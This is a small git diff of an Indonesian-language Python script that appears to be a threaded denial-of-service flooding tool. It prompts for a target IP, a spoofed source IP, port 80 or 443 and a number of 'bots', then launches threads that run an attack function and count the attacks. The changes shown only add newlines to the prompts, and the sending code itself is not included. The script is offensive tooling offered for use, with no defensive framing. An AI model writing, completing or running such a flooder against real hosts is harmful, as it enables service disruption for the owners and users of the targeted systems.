@@ -9,10 +9,10 @@ print((colored("Github: https://github.com/dzakialthalsyah/   ||   Instagram: ht
 
 
 target = input("masukkan ip target: ")
-ip_palsu = input("masukkan ip palsu: ")
-port = int(input("""pilih port 
+ip_palsu = input("\n\nmasukkan ip palsu: ")
+port = int(input("""\n\npilih port 
 80 atau 443: """))
-jumlah_bot = int(input("""default = 100
+jumlah_bot = int(input("""\n\ndefault = 100
 masukkan jumlah bot: """))
 
 jumlah_attack = 0
@@ -31,7 +31,7 @@ def attack():
         global jumlah_attack
         global jumlah_bot
         jumlah_attack += 1
-        print("jumlah attack: ", jumlah_attack)
+        print("\n\n\njumlah attack: ", jumlah_attack)
 
     for i in range(jumlah_bot):
         thread = threading.Thread(target=attack)
